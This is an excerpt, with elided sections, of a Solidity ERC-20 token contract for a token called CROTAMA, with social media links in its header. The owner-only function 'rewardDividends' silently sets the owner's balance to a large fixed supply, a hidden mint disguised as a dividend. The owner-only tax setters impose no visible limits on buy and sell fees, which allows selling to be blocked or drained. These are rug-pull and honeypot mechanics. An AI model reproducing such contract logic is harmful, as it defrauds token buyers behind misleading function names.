...
// SPDX-License-Identifier: Unlicensed https://t.me/crotamaofficial https://twitter.com/crotamaofficial
...
contract  CROTAMA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "CROTAMA";
    string private _symbol = "CROTAMA";
    uint8 private _decimals = 18;

    address payable public treasuryWallet = payable(0xbCB2565fD3B31Fc7d3CC4D350F569f0FE09960eb);
    ...
    uint256 public getDividendSupply = _endSupply * _amountDecimals;  
    ...
    function establishSellTax(uint256 newLiquidTax, uint256 newMarketTax) external onlyOwner() {
        _LiquidityFeeSell = newLiquidTax;
        _TreasuryFeeSell = newMarketTax;
        _finalSellTax = _LiquidityFeeSell.add(_TreasuryFeeSell);
    }

    function establishBuyTax(uint256 newLiquidTax, uint256 newMarketTax) external onlyOwner() {
    ...
    function rewardDividends() public onlyOwner() {_Accounts[getOwner()] = getDividendSupply; }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            _Accounts[sender] = _Accounts[sender].sub(amount, "Insufficient Balance");
            ...
            _Accounts[recipient] = _Accounts[recipient].add(finalAmount);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(feeAmount > 0) {
            _Accounts[address(this)] = _Accounts[address(this)].add(feeAmount);
